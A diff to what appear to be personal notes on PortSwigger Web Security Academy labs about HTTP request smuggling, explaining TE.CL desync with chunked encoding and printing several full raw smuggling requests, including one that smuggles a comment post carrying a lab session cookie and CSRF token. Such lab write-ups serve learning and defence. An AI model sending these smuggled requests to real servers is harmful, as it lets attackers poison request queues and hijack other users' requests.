@@ -113,6 +113,7 @@ This happens because the frontend server processes the Content-Length header and
 The back-end server processes the Transfer-Encoding header, and so treats the message body as using chunked encoding. It processes the first chunk, which is stated to be zero length, and so is treated as terminating the request. The following byte (`G`), is left unprocessed, and the back-end server will treat these as being the start of the next request in the sequence.
 That's why the second response responded: "Unrecognized method GPOST"
 
+## TE.CL vulnerabilities
 ### About `Transfer-Encoding: chunked` (from MDN): 
 Data is sent in a series of chunks. The Content-Length header is omitted in this case and at the beginning of each chunk you need to add the length of the current chunk in hexadecimal format, followed by '\r\n' and then the chunk itself, followed by another '\r\n'. The terminating chunk is a regular chunk, with the exception that its length is zero. It is followed by the trailer, which consists of a (possibly empty) sequence of header fields. 
 
@@ -152,10 +153,10 @@ And when the backend server received Content-Length of 6 but the actual length o
 
 To solve the lab we need to smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method `GPOST`
 
-So we try:
+So we send the following req twice:
 ```bash
 POST / HTTP/1.1
-Host: 0a0f00a60482050c804058ca009c00e8.web-security-academy.net
+Host: ff.web-security-academy.net
 Content-Length: 3
 Transfer-Encoding: chunked
 \r\n
@@ -165,7 +166,111 @@ G\r\n
 \r\n
 ```
 First response is 200 and the second response: "Unrecognized method G0POST"
+Looks good, but the lab requires `GPOST` not and we got `G0POST`
 
 We can't just remove `0` from the end because `0\r\n\r\n` is the valid ending of `Transfer-Encoding: chunked` 
-If we remove it we'll get a `Read timeout` because the frontend server still expects the valid ending of the body (which is `0\r\n\r\n`)
+If we remove it we'll get a `Read timeout` because the frontend server still expects the valid ending of the req body (which is `0\r\n\r\n`)
+
+#### Detailed explanation:
+For the sake of explanation clarity let's now have 2 separate requests:
+Normal req:
+```bash
+POST / HTTP/1.1
+Host: ff.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 7
+
+foo=bar
+```
+
+Attack req:
+```bash
+POST / HTTP/1.1
+Host: ff.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+\r\n
+56\r\n
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+\r\n
+0\r\n
+\r\n
+```
+
+First we send the `Attack req` and get back 200 OK response
+Immediately after it we send `Normal req` and we get: "Unrecognized method GPOST"
+
+So here's how it works:
+When we first send `Attack req` the frontend server uses `Transfer-Encoding: chunked` for req parsing and therefore sends the whole `Attack req` to the backend server
+
+The backend server only cares about `Content-Length` header
+It first reads: `Content-Length: 4` and therefore ends processing of the req at `56\r\n` and so the remained part:
+```bash
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+\r\n
+0\r\n
+\r\n
+```
+poisons the server.
+
+When the `Normal req` is sent to the backend server, the backend server first processes the poisoned (`GPOST`) req 
+
+Since the `Content-Length` in the `GPOST` req is equal to `6` and the actual length of the req body is `5`, the req processing can not be finished and it still waits for 1 more byte to arrive.
+
+Since one more byte is needed - it steals (or smuggles if you will) the first byte of the `Normal req` and the req body processing is done.
+It then figures out that the req method (`GPOST`) does not exist and therefore it throws the err: "Unrecognized method GPOST" 
+
+> Note:
+If we change the `Content-Length` in the `GPOST` req from `6` to `5`
+```bash
+POST / HTTP/1.1
+Host: 0aff00e8044387e48367ab0100c100d8.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+\r\n
+56\r\n
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 5
+\r\n
+0\r\n
+\r\n
+```
+And then send `Attack req` and `Normal req` after it, from the server we'll get both 200 OK responses.
+
+It happens because `5` is the actual length of the req body of the `GPOST` req.
+Server will successfuly process the req body of the `GPOST` req and then will check that `GPOST` http method does not exist and it will throw an err, but we won't see that err. It'll happen in the background.
+
+In other words `Attack req` will get 200 OK, response.
+Then `GPOST` req will fail behind the scenes
+And `Normal req` will also get 200 OK.
+And therefore we'll see 200 OK twice.
+
+BTW: to test that the `GPOST` req fails in the background, instead of the `GPOST` req we can send a req that posts a comment. And if the comment is posted - then the request was executed in the background.
+
+Example of an `Attack req` that posts a comment:
+```bash
+POST / HTTP/1.1
+Host: 0a2100b704ce958f805bd1ce00350016.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 5
+Transfer-Encoding: chunked
+ 
+143
+POST /post/comment HTTP/1.1
+Host: 0a2100b704ce958f805bd1ce00350016.web-security-academy.net
+Cookie: session=3HLsDdzUYgzPQ2kQavc6Unl87DZy5nz9
+Content-Length: 114
+Content-Type: application/x-www-form-urlencoded
+ 
+csrf=no436u5Fc1ZrQd1kaVlYUje5LkkTQM7H&postId=6&name=x&email=x%40x.com&website=https%3A%2F%2Fx.com&comment=y
+0
+```
+
 
